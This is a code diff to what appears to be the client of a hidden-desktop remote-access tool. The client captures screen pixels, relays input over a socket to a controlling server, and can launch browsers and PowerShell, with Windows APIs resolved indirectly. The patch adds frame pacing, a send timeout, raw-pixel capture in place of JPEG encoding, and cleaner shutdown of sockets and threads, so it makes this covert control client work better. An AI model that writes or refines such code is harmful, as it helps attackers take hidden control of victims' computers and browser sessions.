@@ -22,6 +22,8 @@ struct InputMessage
 static const BYTE     gc_magik[] = { 'M', 'E', 'L', 'T', 'E', 'D', 0 };
 static const COLORREF gc_trans = RGB(255, 174, 201);
 static const CLSID jpegID = { 0x557cf401, 0x1a04, 0x11d3,{ 0x9a,0x73,0x00,0x00,0xf8,0x1e,0xf3,0x2e } }; // id of jpeg format
+static const DWORD    gc_frameIntervalMs = 33;
+static const DWORD    gc_socketTimeoutMs = 5000;
 
 enum WmStartApp { startExplorer = WM_USER + 1, startRun, startChrome, startEdge, startBrave, startFirefox, startIexplore, startPowershell };
 
@@ -196,6 +198,9 @@ static BOOL GetDeskPixels(int serverWidth, int serverHeight)
 
     g_lastCaptureFailed = FALSE;
 
+    if (serverWidth <= 0 || serverHeight <= 0 || rect.right <= 0 || rect.bottom <= 0)
+        goto cleanup;
+
     hDc = Funcs::pGetDC(NULL);
     if (!hDc)
         goto cleanup;
@@ -279,10 +284,9 @@ static BOOL GetDeskPixels(int serverWidth, int serverHeight)
     Funcs::pSelectObject(hDcScreen, hOldBmpScreen);
     hOldBmpScreen = NULL;
 
-    if (BitmapToJpg(hDcScreen, hBmpScreen, serverHeight))
-        captureSuccess = TRUE;
-    // Fall back to raw pixels if GDI+ JPEG encoding fails
-    else if (Funcs::pGetDIBits(hDcScreen, hBmpScreen, 0, serverHeight, g_pixels, &g_bmpInfo, DIB_RGB_COLORS) == serverHeight)
+    // Use raw pixels directly. The previous JPEG round-trip was very expensive and
+    // caused visible input lag before the frame was compressed for transport.
+    if (Funcs::pGetDIBits(hDcScreen, hBmpScreen, 0, serverHeight, g_pixels, &g_bmpInfo, DIB_RGB_COLORS) == serverHeight)
         captureSuccess = TRUE;
 
 cleanup:
@@ -390,6 +394,10 @@ static SOCKET ConnectServer()
 
     int one = 1;
     Funcs::pSetsockopt(s, IPPROTO_TCP, TCP_NODELAY, (const char *)&one, sizeof(one));
+    DWORD timeout = gc_socketTimeoutMs;
+    // Keep receive operations blocking. The input channel may be idle until the
+    // user clicks or types, but sends should not block forever on a stalled peer.
+    Funcs::pSetsockopt(s, SOL_SOCKET, SO_SNDTIMEO, (const char *)&timeout, sizeof(timeout));
 
     printf("[+] Connected to server %s:%d\n", g_host, g_port);
     return s;
@@ -554,12 +562,17 @@ static DWORD WINAPI DesktopThread(LPVOID param)
         int response;
         if (!RecvInt(s, &response))
             goto exit;
+
+        Funcs::pSleep(gc_frameIntervalMs);
     }
 
 exit:
     printf("[!] Desktop thread exiting (session %lu)\n", sessionId);
     Funcs::pFree(workSpace);
-    Funcs::pTerminateThread(g_hInputThread, 0);
+    if (s)
+        Funcs::pClosesocket(s);
+    if (g_hInputThread)
+        Funcs::pTerminateThread(g_hInputThread, 0);
     return 0;
 }
 
@@ -773,12 +786,12 @@ static DWORD WINAPI InputThread(LPVOID param)
     if (!SendAll(s, gc_magik, (int)sizeof(gc_magik)))
     {
         printf("[!] Failed to send input channel magic\n");
-        return 0;
+        goto exit;
     }
     if (!SendInt(s, Connection::input))
     {
         printf("[!] Failed to send input channel id\n");
-        return 0;
+        goto exit;
     }
 
     printf("[+] Input channel handshake sent\n");
@@ -787,7 +800,7 @@ static DWORD WINAPI InputThread(LPVOID param)
     if (!RecvInt(s, &sessionId) || !sessionId)
     {
         printf("[!] Failed to receive session id from server\n");
-        return 0;
+        goto exit;
     }
 
     printf("[+] Input channel ready; session id=%d\n", sessionId);
@@ -1121,7 +1134,10 @@ static DWORD WINAPI InputThread(LPVOID param)
     }
 exit:
     printf("[!] Input thread exiting\n");
-    Funcs::pTerminateThread(g_hDesktopThread, 0);
+    if (s)
+        Funcs::pClosesocket(s);
+    if (g_hDesktopThread)
+        Funcs::pTerminateThread(g_hDesktopThread, 0);
     return 0;
 }
 
